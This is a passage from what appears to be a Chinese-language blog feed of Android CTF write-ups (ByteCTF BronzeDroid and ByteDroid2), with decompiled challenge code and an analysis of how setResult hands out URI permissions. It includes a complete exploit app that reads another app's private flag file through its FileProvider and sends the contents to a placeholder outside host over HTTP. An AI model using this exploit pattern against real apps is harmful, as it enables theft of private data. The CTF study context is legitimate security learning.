<span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">        <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> intent.getAction();</span><br><span class="line">        <span class="keyword">if</span> (action != <span class="literal">null</span> &amp;&amp; action.equals(<span class="string">&quot;ACTION_SHARET_TO_ME&quot;</span>)) &#123;</span><br><span class="line">            setResult(-<span class="number">1</span>, getIntent());</span><br><span class="line">            finish();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="FlagReceiver"><a href="#FlagReceiver" class="headerlink" title="FlagReceiver"></a>FlagReceiver</h3><p>跟之前一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.bronzedroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), <span class="string">&quot;flag&quot;</span>);</span><br><span class="line">            writeFile(file, flag);</span><br><span class="line">            Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:7:0x0016 -&gt; B:23:0x0026). Please submit an issue!!! */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(File file, String s)</span> &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file, <span class="literal">true</span>);</span><br><span class="line">                    writer.write(s);</span><br><span class="line">                    writer.write(<span class="number">10</span>);</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                        writer.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">                e2.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e3) &#123;</span><br><span class="line">                    e3.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> th;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析及APP构建"><a href="#漏洞分析及APP构建" class="headerlink" title="漏洞分析及APP构建"></a>漏洞分析及APP构建</h2><p>跟BabyDroid原理一样，返回Intent时就可以带读写权限了</p><p>官方原话:</p><p>Call this to set the result that your activity will return to its caller.</p><p>As of Build.VERSION_CODES.GINGERBREAD, the Intent you supply here can have Intent.FLAG_GRANT_READ_URI_PERMISSION and&#x2F;or Intent.FLAG_GRANT_WRITE_URI_PERMISSION set. This will grant the Activity receiving the result access to the specific URIs in the Intent. Access will remain until the Activity has finished (it will remain across the hosting process being killed and other temporary destruction) and will be added to any existing set of URI permissions it already holds.</p><p>也就是说setResult 可以在原本intent设置 Intent.FLAG_GRANT_READ_URI_PERMISSION 和Intent.FLAG_GRANT_WRITE_URI_PERMISSION的情况下授予接收结果的 Activity 访问 Intent 中指定的 URI 的权限，权限将一直保持直到Activity结束(<strong>直到接收结果的 Activity 自己结束</strong>)。</p><p>MainActivity：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnbronzedroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.activity.EdgeToEdge;</span><br><span class="line"><span class="keyword">import</span> androidx.annotation.Nullable;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        EdgeToEdge.enable(<span class="built_in">this</span>);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setAction(<span class="string">&quot;ACTION_SHARET_TO_ME&quot;</span>);</span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.bronzedroid&quot;</span>, <span class="string">&quot;com.bytectf.bronzedroid.MainActivity&quot;</span>);</span><br><span class="line">        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">&quot;content://com.bytectf.bronzedroid.fileprovider/root/data/data/com.bytectf.bronzedroid/files/flag&quot;</span>));</span><br><span class="line">        startActivityForResult(intent,<span class="number">666</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onActivityResult</span><span class="params">(<span class="type">int</span> requestCode, <span class="type">int</span> resultCode, <span class="meta">@Nullable</span> Intent data)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            inputStream = getContentResolver().openInputStream(data.getData());</span><br><span class="line">            <span class="type">byte</span>[] flag = <span class="keyword">new</span> <span class="title class_">byte</span>[inputStream.available()];</span><br><span class="line">            inputStream.read(flag);</span><br><span class="line">            inputStream.close();</span><br><span class="line">            httpGet(<span class="keyword">new</span> <span class="title class_">String</span>(flag));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">httpGet</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">HttpURLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://xxxxxxxxxxxx/?msg=&quot;</span> + msg);</span><br><span class="line">                    connection = (HttpURLConnection) url.openConnection();</span><br><span class="line">                    connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">                    connection.getInputStream();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260127112833829.png" alt="image-20260127112833829"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ByteDroid2022-BronzeDroid复现&quot;&gt;&lt;a href=&quot;#ByteDroid2022-BronzeDroid复现&quot; class=&quot;headerlink&quot; title=&quot;ByteDroid2022 BronzeDroid复现&quot;&gt;&lt;/a&gt;ByteD</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2021 ByteDroid2复现</title>
    <link href="http://matriy330.github.io/66e1f5f9/"/>
    <id>http://matriy330.github.io/66e1f5f9/</id>
    <published>2026-01-26T11:26:29.000Z</published>
    <updated>2026-01-26T11:27:06.493Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2021-ByteDroid2复现"><a href="#ByteCTF2021-ByteDroid2复现" class="headerlink" title="ByteCTF2021 ByteDroid2复现"></a>ByteCTF2021 ByteDroid2复现</h1><p>参考：<a href="https://my.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg#">ByteCTF2021 writeup for Android challenges - 飞书云文档</a></p><h2 id="APK分析"><a href="#APK分析" class="headerlink" title="APK分析"></a>APK分析</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.bytectf.bytedroid2&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;30&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.ByteDroid2&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.bytedroid2.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.bytedroid2.FlagReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.bytedroid2.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="FlagRecevier"><a href="#FlagRecevier" class="headerlink" title="FlagRecevier"></a>FlagRecevier</h3><p>还是收flag</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.bytedroid2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), <span class="string">&quot;flag&quot;</span>);</span><br><span class="line">            writeFile(file, flag);</span><br><span class="line">            Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:7:0x0016 -&gt; B:23:0x0026). Please submit an issue!!! */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(File file, String s)</span> &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file, <span class="literal">true</span>);</span><br><span class="line">                    writer.write(s);</span><br><span class="line">                    writer.write(<span class="number">10</span>);</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                        writer.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">                e2.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e3) &#123;</span><br><span class="line">                    e3.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> th;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><blockquote><p>MainActivity.java,通过filet协议打开&#x2F;sdcard&#x2F;Documents&#x2F;Bytedroid2&#x2F;index.html,并注册了js接口Bridgeutils,有一个func函数,接收hex编码的字符串</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.bytedroid2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.webkit.JavascriptInterface;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipInputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">func</span><span class="params">(<span class="type">byte</span>[] bArr)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        getIntent().getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;Utils&quot;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/sdcard/Documents/Bytedroid2&quot;</span>, <span class="string">&quot;/index.html&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                UnZipAssetsFolder(getApplicationContext(), <span class="string">&quot;game.zip&quot;</span>, <span class="string">&quot;/sdcard/Documents/Bytedroid2&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line">        webView.addJavascriptInterface(<span class="built_in">this</span>, <span class="string">&quot;BridgeUtils&quot;</span>);</span><br><span class="line">        setContentView(webView);</span><br><span class="line">        webView.loadUrl(<span class="string">&quot;file:&quot;</span> + file.getPath() + <span class="string">&quot;?lang=&quot;</span> + Locale.getDefault().getLanguage());</span><br><span class="line">    